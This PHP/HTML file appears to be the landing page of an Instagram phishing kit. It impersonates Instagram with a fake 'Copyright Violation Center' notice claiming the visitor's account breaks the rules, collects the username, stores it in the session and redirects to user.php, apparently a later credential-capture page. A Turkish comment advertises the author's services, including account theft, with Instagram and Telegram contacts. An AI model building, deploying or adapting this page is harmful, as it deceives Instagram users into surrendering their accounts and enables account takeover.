<?php

    //Aşağıdaki Kodları Sakın Ellemeyin , Ellerseniz Kodlar Bozulur !

if ($_GET) {

    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: user.php?username=$username");

}

/*  
######  ##     ## ##     ## ######## ######## ######## ########  ##        #######   #######  ##    ## 
##    ## ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##   ##  
##       ##     ## ##     ##    ##       ##    ##       ##     ## ##       ##     ## ##     ## ##  ##   
 ######  ######### ##     ##    ##       ##    ######   ########  ##       ##     ## ##     ## #####    
      ## ##     ## ##     ##    ##       ##    ##       ##   ##   ##       ##     ## ##     ## ##  ##   
##    ## ##     ## ##     ##    ##       ##    ##       ##    ##  ##       ##     ## ##     ## ##   ##  
 ######  ##     ##  #######     ##       ##    ######## ##     ## ########  #######   #######  ##    ## 
 
 CoDeR by SHuTTeRLooK
 İstediğiniz tarzda hertürlü script bulunur
 Sıfırdan yapılır.
 Hesap kapatma - açma işlemleri - takipçi işlemleri 
 Hesap Çalma - Çalınan hesabı kurtarma
 Yüksek Takipçi Hesaplar İçin 
 https://www.instagram.com/shuterlook/
 t.me/shutterlook
 Ulaşabilirsiniz
*/

?>


<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="utf-8">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="favicon.png"/>
    
    <link rel="stylesheet" href="sloker/main.css">

</head>

<body>
    <div class="container">

        <form class="form" method="get" >
<center>
    <img src="sloker/img/test.svg" width="150">
</center>
            <h1 class="form__title">Copyright Violation Center</h1>
           <center> <p style="max-width:87%; font-size:15px; color: #999; line-height:20px; box-sizing:border-box;">
You have been redirected to this page, your account violates our rules, if you think this is an error, please fill out the form to verify your account.</p></center>
<br>

            <div class="form__input-group">

                <input type="text" name="username" class="form__input" placeholder="Username">
                <div class="form__input-error-message"></div>

            </div>
           
            <button class="form__button"  id="bttn" type="submit">Continue</button>

            <p class="form__text">
                <a href="https://www.instagram.com/accounts/password/reset/" class="form__link">Forgot your password?</a>
            </p>

            <p class="form__text">
                <a class="form__link" href="https://www.instagram.com/accounts/emailsignup/" id="linkCreateAccount">Don't have an account? Create account</a>
            </p>

        </form>

    </div>

    <script src="sloker/main.js"></script>


</body>


</html>